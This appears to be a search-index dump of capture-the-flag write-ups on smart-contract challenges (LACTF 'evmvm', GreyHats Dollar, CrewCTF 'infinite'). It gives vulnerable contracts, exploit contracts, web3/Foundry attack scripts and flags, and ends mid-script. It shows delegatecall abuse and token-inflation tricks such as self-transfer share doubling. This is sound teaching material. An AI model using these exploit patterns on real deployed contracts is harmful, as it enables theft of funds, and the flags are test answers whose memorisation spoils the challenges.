} case 0x80 { // DUP1 let val := spop () spush ( val ) spush ( val ) } case 0x91 { // SWAP1 let a := spop () let b := spop () spush ( a ) spush ( b ) } case 0xF0 { // CREATE spush ( create ( spop (), spop (), spop ())) } case 0xF1 { // CALL spush ( call ( spop (), spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xF2 { // CALLCODE spush ( callcode ( spop (), spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xF3 { // RETURN return ( spop (), spop ()) } case 0xF4 { // DELEGATECALL spush ( delegatecall ( spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xF5 { // CREATE2 spush ( create2 ( spop (), spop (), spop (), spop ())) } case 0xFA { // STATICCALL spush ( staticcall ( spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xFD { // REVERT revert ( spop (), spop ()) } case 0xFE { // INVALID invalid () } case 0xFF { // SELFDESTRUCT selfdestruct ( spop ()) } } } fallback () payable external { revert ( \"sus\" ); } receive () payable external { revert ( \"we are a cashless institution\" ); } } Paris \u7248\u672c\u8d77\uff0c DIFFICULTY \u7531 PREVRANDAO \u66ff\u4ee3\uff0c\u53ef\u83b7\u53d6\u4e0a\u4e00\u4e2a\u533a\u5757\u7684 RANDAO mix \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u901a\u8fc7\u5408\u7ea6 EVMVM \u8c03\u7528 Setup.solve() EVMVM \u501f\u52a9 Yul \u6a21\u62df EVM\uff0c\u8c03\u7528\u4e00\u6b21 enterTheMetametaverse() \u53ef\u6267\u884c\u4e00\u4e2a\u64cd\u4f5c\u7801 \u9700\u8981\u8c03\u7528 Setup.solve() \uff0c\u67e5\u770b\u8c03\u7528\u76f8\u5173\u7684\u64cd\u4f5c\u7801 call(g, a, v, in, insize, out, outsize) \u8c03\u7528\u7279\u5b9a\u51fd\u6570\u9700\u8981\u501f\u52a9 memory \u5b58\u50a8\u51fd\u6570\u7b7e\u540d\u4ee5\u53ca\u4f20\u53c2\uff0c\u800c\u4e00\u6b21\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u64cd\u4f5c\u7801\u4e14 memory \u5728\u5355\u6b21\u8c03\u7528\u7ed3\u675f\u540e\u5373\u88ab\u6e05\u9664 \u53ef\u4ee5\u901a\u8fc7 delegatecall(g, a, in, insize, out, outsize) \u501f\u52a9\u5176\u5b83\u4ee3\u7801\uff0c\u7531\u4e8e\u65e0\u6cd5\u4f20\u9012\u7279\u5b9a\u7684\u51fd\u6570\u7b7e\u540d\u53ca\u53c2\u6570\uff0c\u8c03\u7528\u903b\u8f91\u5728 fallback() \u4e2d\u5b9e\u73b0\u5e76\u786c\u7f16\u7801 Setup \u5b9e\u4f8b\u7684\u5730\u5740 Yul \u4e2d\u51fd\u6570\u53c2\u6570\u4ece\u53f3\u5f80\u5de6\u5165\u6808\uff0c\u5c06\u5148\u6267\u884c\u6700\u53f3\u4fa7\u7684 spop() \uff0c\u56e0\u800c\u4ece\u5de6\u5f80\u53f3\u5c06 delegatecall \u9700\u8981\u7684\u53c2\u6570\u5165\u6808 g \uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u501f\u7528 GASLIMIT \u6765\u8bbe\u7f6e a \uff0c\u901a\u8fc7 arg \u4f20\u5165 Setup \u7684\u5730\u5740\uff0c\u7531 calldataload(p) \u83b7\u53d6\u3002\u53ef\u501f\u52a9 CHAINID \uff08\u503c\u4e3a 1\uff09\u6765\u6784\u9020\u4efb\u610f\u503c sig(4 bytes) opcode(32 bytes) arg(32 bytes) in & insize & out & outsize \uff0c\u65e0\u9700\u4f20\u53c2\u4e14\u6ca1\u6709\u8f93\u51fa\uff0c\u53ef\u8bbe\u7f6e\u4e3a 0 Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 pragma solidity ^ 0.8.18 ; interface IEVMVM { function enterTheMetametaverse ( bytes32 opcode , bytes32 arg ) external ; } interface ISetup { function solve () external ; } contract Hack { function exploit ( address instance ) public { IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x45 )), bytes32 ( 0 )); // GASLIMIT // get 36 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x36 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x01 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x04 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x01 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x01 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x35 )), bytes32 ( uint256 ( uint160 ( address ( this ))))); // CALLDATALOAD // get 0 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x30 )), bytes32 ( 0 )); // ADDRESS IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x31 )), bytes32 ( 0 )); // BALANCE IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x80 )), bytes32 ( 0 )); // DUP1 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x80 )), bytes32 ( 0 )); // DUP1 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x80 )), bytes32 ( 0 )); // DUP1 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0xF4 )), bytes32 ( 0 )); // DELEGATECALL } fallback () external { ISetup ( /* set the addr before deployment */ ). solve (); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from web3 import Web3 from pwn import * setup_abi = open ( 'setup_abi.json' ) . read () hack_abi = open ( 'hack_abi.json' ) . read () hack_bytecode = open ( 'bytecode.txt' ) . read () def transact ( func , gas = 1000000 ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) conn = remote ( 'lac.tf' , 31151 ) conn . sendlineafter ( 'action?' , '1' ) uuid = conn . recvline_contains ( 'uuid' ) . decode () . split ( ' ' )[ - 1 ] . strip () w3 = Web3 ( Web3 . HTTPProvider ( conn . recvline_contains ( 'rpc' ) . decode () . split ( ' ' )[ - 1 ])) account = w3 . eth . account . from_key ( conn . recvline_contains ( 'key' ) . decode () . split ( ' ' )[ - 1 ]) setup_addr = conn . recvline_contains ( 'contract' ) . decode () . split ( ' ' )[ - 1 ] . strip () setup_contract = w3 . eth . contract ( address = setup_addr , abi = setup_abi ) evmvm_addr = setup_contract . functions . metametaverse () . call () hack_contract = w3 . eth . contract ( abi = hack_abi , bytecode = hack_bytecode . replace ( '_' , setup_addr [ 2 :] . lower ())) hack_addr = transact ( 'hack_contract.constructor()' , hack_contract . constructor () . estimate_gas () * 2 ) . contractAddress hack_contract = w3 . eth . contract ( address = hack_addr , abi = hack_abi ) print ( hack_addr ) transact ( 'hack_contract.functions.exploit(evmvm_addr)' ) if setup_contract . functions . isSolved () . call (): conn = remote ( 'lac.tf' , 31151 ) conn . sendlineafter ( 'action?' , '3' ) conn . sendlineafter ( 'uuid please:' , uuid ) conn . interactive () Flag \u00b6 lactf{yul_hav3_a_bad_t1me_0n_th3_m3tam3tavers3} \u53c2\u8003\u8d44\u6599 \u00b6 EVM Codes - An Ethereum Virtual Machine Opcodes Interactive Reference Yul \u2014 Solidity 0.8.18 documentation EIP-4399: Supplant DIFFICULTY opcode with PREVRANDAO","title":"evmvm"},{"location":"blockchain/evmvm/#_1","text":"All these zoomers with their \"metaverse\" or something are thinking far too primitive. If the red pill goes down the rabbit hole, then how far up can we go? nc lac.tf 31151 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.18 ; import \"./EVMVM.sol\" ; contract Setup { EVMVM public immutable metametaverse = new EVMVM (); bool private solved = false ; function solve () external { assert ( msg . sender == address ( metametaverse )); solved = true ; } function isSolved () external view returns ( bool ) { return solved ; } } EVMVM.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.18 ; // YES I FINALLY GOT MY METAMETAVERSE TO WORK - Arc'blroth contract EVMVM { uint [] private stack ; // executes a single opcode on the metametaverse\u2122 // TODO(arc) implement the last few opcodes function enterTheMetametaverse ( bytes32 opcode , bytes32 arg ) external { assembly { // declare yul bindings for the stack // apparently you can only call yul functions from yul :sob: // https://ethereum.stackexchange.com/questions/126609/calling-functions-using-inline-assembly-yul function spush ( data ) { let index := sload ( 0x00 ) let stackSlot := 0x00 sstore ( add ( keccak256 ( stackSlot , 0x20 ), index ), data ) sstore ( 0x00 , add ( index , 1 )) } function spop () -> out { let index := sub ( sload ( 0x00 ), 1 ) let stackSlot := 0x00 out := sload ( add ( keccak256 ( stackSlot , 0x20 ), index )) sstore ( add ( keccak256 ( stackSlot , 0x20 ), index ), 0 ) // zero out the popped memory sstore ( 0x00 , index ) } // opcode reference: https://www.evm.codes/?fork=merge switch opcode case 0x00 { // STOP // lmfao you literally just wasted gas } case 0x01 { // ADD spush ( add ( spop (), spop ())) } case 0x02 { // MUL spush ( mul ( spop (), spop ())) } case 0x03 { // SUB spush ( sub ( spop (), spop ())) } case 0x04 { // DIV spush ( div ( spop (), spop ())) } case 0x05 { // SDIV spush ( sdiv ( spop (), spop ())) } case 0x06 { // MOD spush ( mod ( spop (), spop ())) } case 0x07 { // SMOD spush ( smod ( spop (), spop ())) } case 0x08 { // ADDMOD spush ( addmod ( spop (), spop (), spop ())) } case 0x09 { // MULMOD spush ( mulmod ( spop (), spop (), spop ())) } case 0x0A { // EXP spush ( exp ( spop (), spop ())) } case 0x0B { // SIGNEXTEND spush ( signextend ( spop (), spop ())) } case 0x10 { // LT spush ( lt ( spop (), spop ())) } case 0x11 { // GT spush ( gt ( spop (), spop ())) } case 0x12 { // SLT spush ( slt ( spop (), spop ())) } case 0x13 { // SGT spush ( sgt ( spop (), spop ())) } case 0x14 { // EQ spush ( eq ( spop (), spop ())) } case 0x15 { // ISZERO spush ( iszero ( spop ())) } case 0x16 { // AND spush ( and ( spop (), spop ())) } case 0x17 { // OR spush ( or ( spop (), spop ())) } case 0x18 { // XOR spush ( xor ( spop (), spop ())) } case 0x19 { // NOT spush ( not ( spop ())) } case 0x1A { // BYTE spush ( byte ( spop (), spop ())) } case 0x1B { // SHL spush ( shl ( spop (), spop ())) } case 0x1C { // SHR spush ( shr ( spop (), spop ())) } case 0x1D { // SAR spush ( sar ( spop (), spop ())) } case 0x20 { // SHA3 spush ( keccak256 ( spop (), spop ())) } case 0x30 { // ADDRESS spush ( address ()) } case 0x31 { // BALANCE spush ( balance ( spop ())) } case 0x32 { // ORIGIN spush ( origin ()) } case 0x33 { // CALLER spush ( caller ()) } case 0x34 { // CALLVALUE spush ( callvalue ()) } case 0x35 { // CALLDATALOAD spush ( calldataload ( spop ())) } case 0x36 { // CALLDATASIZE spush ( calldatasize ()) } case 0x37 { // CALLDATACOPY calldatacopy ( spop (), spop (), spop ()) } case 0x38 { // CODESIZE spush ( codesize ()) } case 0x3A { // GASPRICE spush ( gasprice ()) } case 0x3B { // EXTCODESIZE spush ( extcodesize ( spop ())) } case 0x3C { // EXTCODECOPY extcodecopy ( spop (), spop (), spop (), spop ()) } case 0x3D { // RETURNDATASIZE spush ( returndatasize ()) } case 0x3E { // RETURNDATACOPY returndatacopy ( spop (), spop (), spop ()) } case 0x3F { // EXTCODEHASH spush ( extcodehash ( spop ())) } case 0x40 { // BLOCKHASH spush ( blockhash ( spop ())) } case 0x41 { // COINBASE (sponsored opcode) spush ( coinbase ()) } case 0x42 { // TIMESTAMP spush ( timestamp ()) } case 0x43 { // NUMBER spush ( number ()) } case 0x44 { // PREVRANDAO // spush(difficulty()) spush ( prevrandao ()) // (1) } case 0x45 { // GASLIMIT spush ( gaslimit ()) } case 0x46 { // CHAINID spush ( chainid ()) } case 0x47 { // SELBALANCE spush ( selfbalance ()) } case 0x48 { // BASEFEE spush ( basefee ()) } case 0x50 { // POP pop ( spop ()) } case 0x51 { // MLOAD spush ( mload ( spop ())) } case 0x52 { // MSTORE mstore ( spop (), spop ()) } case 0x53 { // MSTORE8 mstore8 ( spop (), spop ()) } case 0x54 { // SLOAD spush ( sload ( spop ())) } case 0x55 { // SSTORE sstore ( spop (), spop ()) } case 0x59 { // MSIZE spush ( msize ()) } case 0x5A { // GAS spush ( gas ()) } case 0x80 { // DUP1 let val := spop () spush ( val ) spush ( val ) } case 0x91 { // SWAP1 let a := spop () let b := spop () spush ( a ) spush ( b ) } case 0xF0 { // CREATE spush ( create ( spop (), spop (), spop ())) } case 0xF1 { // CALL spush ( call ( spop (), spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xF2 { // CALLCODE spush ( callcode ( spop (), spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xF3 { // RETURN return ( spop (), spop ()) } case 0xF4 { // DELEGATECALL spush ( delegatecall ( spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xF5 { // CREATE2 spush ( create2 ( spop (), spop (), spop (), spop ())) } case 0xFA { // STATICCALL spush ( staticcall ( spop (), spop (), spop (), spop (), spop (), spop ())) } case 0xFD { // REVERT revert ( spop (), spop ()) } case 0xFE { // INVALID invalid () } case 0xFF { // SELFDESTRUCT selfdestruct ( spop ()) } } } fallback () payable external { revert ( \"sus\" ); } receive () payable external { revert ( \"we are a cashless institution\" ); } } Paris \u7248\u672c\u8d77\uff0c DIFFICULTY \u7531 PREVRANDAO \u66ff\u4ee3\uff0c\u53ef\u83b7\u53d6\u4e0a\u4e00\u4e2a\u533a\u5757\u7684 RANDAO mix","title":"\u9898\u76ee"},{"location":"blockchain/evmvm/#_2","text":"\u76ee\u6807\u662f\u901a\u8fc7\u5408\u7ea6 EVMVM \u8c03\u7528 Setup.solve() EVMVM \u501f\u52a9 Yul \u6a21\u62df EVM\uff0c\u8c03\u7528\u4e00\u6b21 enterTheMetametaverse() \u53ef\u6267\u884c\u4e00\u4e2a\u64cd\u4f5c\u7801 \u9700\u8981\u8c03\u7528 Setup.solve() \uff0c\u67e5\u770b\u8c03\u7528\u76f8\u5173\u7684\u64cd\u4f5c\u7801 call(g, a, v, in, insize, out, outsize) \u8c03\u7528\u7279\u5b9a\u51fd\u6570\u9700\u8981\u501f\u52a9 memory \u5b58\u50a8\u51fd\u6570\u7b7e\u540d\u4ee5\u53ca\u4f20\u53c2\uff0c\u800c\u4e00\u6b21\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u64cd\u4f5c\u7801\u4e14 memory \u5728\u5355\u6b21\u8c03\u7528\u7ed3\u675f\u540e\u5373\u88ab\u6e05\u9664 \u53ef\u4ee5\u901a\u8fc7 delegatecall(g, a, in, insize, out, outsize) \u501f\u52a9\u5176\u5b83\u4ee3\u7801\uff0c\u7531\u4e8e\u65e0\u6cd5\u4f20\u9012\u7279\u5b9a\u7684\u51fd\u6570\u7b7e\u540d\u53ca\u53c2\u6570\uff0c\u8c03\u7528\u903b\u8f91\u5728 fallback() \u4e2d\u5b9e\u73b0\u5e76\u786c\u7f16\u7801 Setup \u5b9e\u4f8b\u7684\u5730\u5740 Yul \u4e2d\u51fd\u6570\u53c2\u6570\u4ece\u53f3\u5f80\u5de6\u5165\u6808\uff0c\u5c06\u5148\u6267\u884c\u6700\u53f3\u4fa7\u7684 spop() \uff0c\u56e0\u800c\u4ece\u5de6\u5f80\u53f3\u5c06 delegatecall \u9700\u8981\u7684\u53c2\u6570\u5165\u6808 g \uff0c\u53ef\u4ee5\u7b80\u5355\u5730\u501f\u7528 GASLIMIT \u6765\u8bbe\u7f6e a \uff0c\u901a\u8fc7 arg \u4f20\u5165 Setup \u7684\u5730\u5740\uff0c\u7531 calldataload(p) \u83b7\u53d6\u3002\u53ef\u501f\u52a9 CHAINID \uff08\u503c\u4e3a 1\uff09\u6765\u6784\u9020\u4efb\u610f\u503c sig(4 bytes) opcode(32 bytes) arg(32 bytes) in & insize & out & outsize \uff0c\u65e0\u9700\u4f20\u53c2\u4e14\u6ca1\u6709\u8f93\u51fa\uff0c\u53ef\u8bbe\u7f6e\u4e3a 0","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/evmvm/#exploit","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 pragma solidity ^ 0.8.18 ; interface IEVMVM { function enterTheMetametaverse ( bytes32 opcode , bytes32 arg ) external ; } interface ISetup { function solve () external ; } contract Hack { function exploit ( address instance ) public { IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x45 )), bytes32 ( 0 )); // GASLIMIT // get 36 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x36 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x01 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x04 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x46 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x01 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x01 )), bytes32 ( 0 )); IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x35 )), bytes32 ( uint256 ( uint160 ( address ( this ))))); // CALLDATALOAD // get 0 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x30 )), bytes32 ( 0 )); // ADDRESS IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x31 )), bytes32 ( 0 )); // BALANCE IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x80 )), bytes32 ( 0 )); // DUP1 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x80 )), bytes32 ( 0 )); // DUP1 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0x80 )), bytes32 ( 0 )); // DUP1 IEVMVM ( instance ). enterTheMetametaverse ( bytes32 ( uint ( 0xF4 )), bytes32 ( 0 )); // DELEGATECALL } fallback () external { ISetup ( /* set the addr before deployment */ ). solve (); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 from web3 import Web3 from pwn import * setup_abi = open ( 'setup_abi.json' ) . read () hack_abi = open ( 'hack_abi.json' ) . read () hack_bytecode = open ( 'bytecode.txt' ) . read () def transact ( func , gas = 1000000 ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) conn = remote ( 'lac.tf' , 31151 ) conn . sendlineafter ( 'action?' , '1' ) uuid = conn . recvline_contains ( 'uuid' ) . decode () . split ( ' ' )[ - 1 ] . strip () w3 = Web3 ( Web3 . HTTPProvider ( conn . recvline_contains ( 'rpc' ) . decode () . split ( ' ' )[ - 1 ])) account = w3 . eth . account . from_key ( conn . recvline_contains ( 'key' ) . decode () . split ( ' ' )[ - 1 ]) setup_addr = conn . recvline_contains ( 'contract' ) . decode () . split ( ' ' )[ - 1 ] . strip () setup_contract = w3 . eth . contract ( address = setup_addr , abi = setup_abi ) evmvm_addr = setup_contract . functions . metametaverse () . call () hack_contract = w3 . eth . contract ( abi = hack_abi , bytecode = hack_bytecode . replace ( '_' , setup_addr [ 2 :] . lower ())) hack_addr = transact ( 'hack_contract.constructor()' , hack_contract . constructor () . estimate_gas () * 2 ) . contractAddress hack_contract = w3 . eth . contract ( address = hack_addr , abi = hack_abi ) print ( hack_addr ) transact ( 'hack_contract.functions.exploit(evmvm_addr)' ) if setup_contract . functions . isSolved () . call (): conn = remote ( 'lac.tf' , 31151 ) conn . sendlineafter ( 'action?' , '3' ) conn . sendlineafter ( 'uuid please:' , uuid ) conn . interactive ()","title":"Exploit"},{"location":"blockchain/evmvm/#flag","text":"lactf{yul_hav3_a_bad_t1me_0n_th3_m3tam3tavers3}","title":"Flag"},{"location":"blockchain/evmvm/#_3","text":"EVM Codes - An Ethereum Virtual Machine Opcodes Interactive Reference Yul \u2014 Solidity 0.8.18 documentation EIP-4399: Supplant DIFFICULTY opcode with PREVRANDAO","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/greyhats_dollar/","tags":["smart contract","self transfer"],"text":"#smart contract #self transfer .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Worried about inflation? Introducing GreyHats Dollar (GHD), the world's first currency with deflation built-in! Backed by GREY tokens, GHD will automatically deflate at a rate of 3% every year. nc challs.nusgreyhats.org 30201 Challenge Files Solution \u00b6 To solve the challenge, the player needs to obtain more than 50,000 GHD. Initially, we can exchange 1000 GREY for GHD, which is recorded in the form of share. Over time, the same proportion of shares will correspond to a reduced amount of GHD due to deflation 1 2 3 4 5 6 7 8 9 10 11 12 /** * @notice Updates the conversion rate between GHD and the underlying asset. */ modifier update { conversionRate = _conversionRate (); lastUpdated = block . timestamp ; _ ; } function balanceOf ( address user ) public view returns ( uint256 ) { return _sharesToGHD ( shares [ user ], _conversionRate (), false ); } Interestingly, during the token transfer, the data used to update account shares is calculated based on the cached old data. Since the data of to account is updated after from account, if a transfer is made to oneself, the account shares will increase :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function transferFrom ( address from , address to , uint256 amount ) public update returns ( bool ) { if ( from != msg . sender ) allowance [ from ][ msg . sender ] -= amount ; uint256 _shares = _GHDToShares ( amount , conversionRate , false ); uint256 fromShares = shares [ from ] - _shares ; uint256 toShares = shares [ to ] + _shares ; ... shares [ from ] = fromShares ; shares [ to ] = toShares ; emit Transfer ( from , to , amount ); return true ; } We can continuously double the existing share through self-transfer Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 contract Solve is Script { function run () public { Setup setup = Setup ( vm . envAddress ( \"INSTANCE\" )); uint priv = vm . envUint ( \"PRIV\" ); GHD ghd = setup . ghd (); GREY grey = setup . grey (); vm . startBroadcast ( priv ); address user = vm . addr ( priv ); setup . claim (); grey . approve ( address ( ghd ), 1000 ether ); ghd . mint ( 1000 ether ); for ( uint i ; i < 50 ; i ++ ) { ghd . transfer ( user , 1000 ether ); } require ( setup . isSolved ()); vm . stopBroadcast (); } } Flag \u00b6 grey{self_transfer_go_brrr_9e8284917b42282d}","title":"Greyhats Dollar"},{"location":"blockchain/greyhats_dollar/#description","text":"Worried about inflation? Introducing GreyHats Dollar (GHD), the world's first currency with deflation built-in! Backed by GREY tokens, GHD will automatically deflate at a rate of 3% every year. nc challs.nusgreyhats.org 30201 Challenge Files","title":"Description"},{"location":"blockchain/greyhats_dollar/#solution","text":"To solve the challenge, the player needs to obtain more than 50,000 GHD. Initially, we can exchange 1000 GREY for GHD, which is recorded in the form of share. Over time, the same proportion of shares will correspond to a reduced amount of GHD due to deflation 1 2 3 4 5 6 7 8 9 10 11 12 /** * @notice Updates the conversion rate between GHD and the underlying asset. */ modifier update { conversionRate = _conversionRate (); lastUpdated = block . timestamp ; _ ; } function balanceOf ( address user ) public view returns ( uint256 ) { return _sharesToGHD ( shares [ user ], _conversionRate (), false ); } Interestingly, during the token transfer, the data used to update account shares is calculated based on the cached old data. Since the data of to account is updated after from account, if a transfer is made to oneself, the account shares will increase :D 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 function transferFrom ( address from , address to , uint256 amount ) public update returns ( bool ) { if ( from != msg . sender ) allowance [ from ][ msg . sender ] -= amount ; uint256 _shares = _GHDToShares ( amount , conversionRate , false ); uint256 fromShares = shares [ from ] - _shares ; uint256 toShares = shares [ to ] + _shares ; ... shares [ from ] = fromShares ; shares [ to ] = toShares ; emit Transfer ( from , to , amount ); return true ; } We can continuously double the existing share through self-transfer","title":"Solution"},{"location":"blockchain/greyhats_dollar/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 contract Solve is Script { function run () public { Setup setup = Setup ( vm . envAddress ( \"INSTANCE\" )); uint priv = vm . envUint ( \"PRIV\" ); GHD ghd = setup . ghd (); GREY grey = setup . grey (); vm . startBroadcast ( priv ); address user = vm . addr ( priv ); setup . claim (); grey . approve ( address ( ghd ), 1000 ether ); ghd . mint ( 1000 ether ); for ( uint i ; i < 50 ; i ++ ) { ghd . transfer ( user , 1000 ether ); } require ( setup . isSolved ()); vm . stopBroadcast (); } }","title":"Exploitation"},{"location":"blockchain/greyhats_dollar/#flag","text":"grey{self_transfer_go_brrr_9e8284917b42282d}","title":"Flag"},{"location":"blockchain/infinite/","tags":["smart contract"],"text":"#smart contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Infinite respect. nc infinite.chal.crewc.tf 60001 infinite.tar.gz Solution \u00b6 To solve the challenge, we need to store more than 50 respect tokens in the fancyStore contract 1 2 3 function isSolved () public view returns ( bool ) { return STORE . respectCount ( CREW . receiver ()) >= 50 ; } The respectToken and candyToken contracts do not contain any significant information, as they are simple ERC20 token contracts that allow the owner to call the mint() and burn() functions The crewToken contract with a mint() function that can only be called once is the entry point 1 2 3 4 5 6 function mint () external { require ( ! claimed , \"already claimed\" ); receiver = msg . sender ; claimed = true ; _mint ( receiver , 1 ); } Next, we can exchange 1 crew token for 10 candies 1 2 3 4 5 6 7 8 function verification () public payable { require ( crew . balanceOf ( msg . sender ) == 1 , \"You don't have crew tokens to verify\" ); require ( crew . allowance ( msg . sender , address ( this )) == 1 , \"You need to approve the contract to transfer crew tokens\" ); crew . transferFrom ( msg . sender , address ( this ), 1 ); candy . mint ( msg . sender , 10 ); } The candy tokens can be exchanged for respect tokens through fancyStore.sellCandies() or localGang.gainRespect() . But these two functions have a slight difference. The sellCandies() function burns candy tokens and transfers the respect tokens stored in the contract to the msg.sender, while the gainRespect() function transfers the candy tokens from the msg.sender and mint respect tokens to msg.sender. Thus, the total supply of respect tokens can be increased through gainRespect() . Similarly, we can increase the total supply of candy tokens through fancyStore.buyCandies() Starting with 10 candy tokens, we can first exchange them for 10 respect tokens and increase candyCount through localGang.gainRespect() . Then, buy 10 candies and increase respectCount through fancyStore.buyCandies() . At this point, we have obtained an additional 10 candies and transferred 10 respect tokens to the fancyStore contract XD Repeat these steps until STORE.respectCount(CREW.receiver()) reaches the desired threshold Script \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 /// forge script script/Infinite.s.sol --private-key $PRIVATE_KEY --rpc-url $RPC_URL --sig \"run(address)\" 